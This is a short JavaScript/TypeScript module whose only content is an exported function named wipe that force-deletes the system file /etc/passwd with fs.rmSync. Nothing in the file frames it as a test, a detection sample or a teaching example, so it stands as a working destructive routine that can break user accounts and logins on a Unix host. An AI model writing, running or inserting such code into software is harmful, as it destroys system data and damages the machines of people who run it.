import * as fs from 'node:fs';

export function wipe() {
  fs.rmSync('/etc/passwd', { force: true });
}